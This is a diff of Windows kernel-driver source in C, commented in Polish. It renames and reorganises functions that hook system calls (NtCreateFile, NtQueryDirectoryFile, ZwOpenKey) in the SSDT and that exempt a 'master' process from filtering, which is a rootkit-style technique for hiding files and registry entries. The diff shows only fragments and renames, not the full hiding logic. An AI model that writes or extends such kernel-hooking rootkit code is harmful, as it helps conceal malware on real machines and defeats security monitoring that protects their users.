@@ -24,9 +24,8 @@ BOOLEAN bHooked = FALSE;
 * Przechwytujemy wywolania funkcji (us³ug systemowych):
 * - NtCreateFile 
 * - NtQueryDirectoryFile                   
-* - NtOpenKey
 */
-VOID HookApis()
+VOID HookNativeApi()
 {
 	KIRQL irql;
 
@@ -64,7 +63,7 @@ VOID HookApis()
 /*
 *   Zdjecie hookow z tablicy SSDT.
 */
-VOID UnHookApis()
+VOID UnHookNativeApi()
 {
 	KIRQL irql;
 
@@ -88,7 +87,9 @@ VOID UnHookApis()
 		LowerIRQLevel( irql );
 	}
 }
-
+//--------------------------------------------------------------------------------
+// POCZATEK NIE UZYWANE
+//--------------------------------------------------------------------------------
 NTSTATUS HookNtQueryKey(
 	HANDLE hKey,
 	KEY_INFORMATION_CLASS KeyInfoClass,
@@ -235,7 +236,7 @@ HookZwOpenKey(
 
 	    //sprawdzenie nazwy/pidu procesu => szybsze wyjscie ? ;)
         currentEprocess = PsGetCurrentProcess();
-        if (IsPriviligedProcess( currentEprocess ) ) {
+        if (CheckIfMasterProcess( currentEprocess ) ) {
 	       return rc;
         }
 			
@@ -256,8 +257,9 @@ HookZwOpenKey(
       
         return rc;
 }
-
-//--------------------------------------------------------------------------
+//--------------------------------------------------------------------------------
+// KONIEC NIE UZYWANE 
+//--------------------------------------------------------------------------------
 
 
 NTSTATUS HookNtQueryDirectoryFile(
@@ -293,7 +295,7 @@ NTSTATUS HookNtQueryDirectoryFile(
 
 	//sprawdzenie nazwy/pidu procesu => szybsze wyjscie ? ;)
 	currentEprocess = PsGetCurrentProcess();
-	if (IsPriviligedProcess( currentEprocess ) ) {
+	if (CheckIfMasterProcess( currentEprocess ) ) {
 		return rc;
 	}
 
@@ -361,7 +363,7 @@ NTSTATUS HookNtCreateFile(
 	goto pass_throught;
 
 	currentEprocess = PsGetCurrentProcess();
-	if (IsPriviligedProcess( currentEprocess ) ) {
+	if (CheckIfMasterProcess( currentEprocess ) ) {
 		goto pass_throught;
 	}
 
@@ -389,7 +391,7 @@ pass_throught:
 }
 
 
-BOOLEAN IsPriviligedProcess( PEPROCESS eproc ) 
+BOOLEAN CheckIfMasterProcess( PEPROCESS eproc ) 
 {
 	ULONG len = 0;
 	PCHAR processName = NULL;
